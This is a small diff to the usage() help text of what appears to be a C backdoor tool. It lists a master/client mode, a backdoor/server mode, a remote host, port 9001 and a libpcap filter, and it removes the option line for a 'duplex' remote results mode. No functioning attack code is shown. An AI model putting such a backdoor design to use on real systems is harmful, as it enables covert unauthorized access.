@@ -19,7 +19,6 @@ void usage(char *name)
 	printf("Usage: [options] [remote host]%s\n", name);
 	printf(" -c Use client mode: Act as master.\n");
 	printf(" -s Use server mode: Act as backdoor. [default]\n");
-	printf(" -d Use duplex mode: Send/get results remotely.\n");
 	printf(" -i <arg> Remote host address for client mode. [default=127.0.0.1]\n");
 	printf(" -p <arg> Remote port to use. [default=9001]\n");
 	printf(" -f <arg> Libpcap filter to use. [default=udp port 9001]\n");
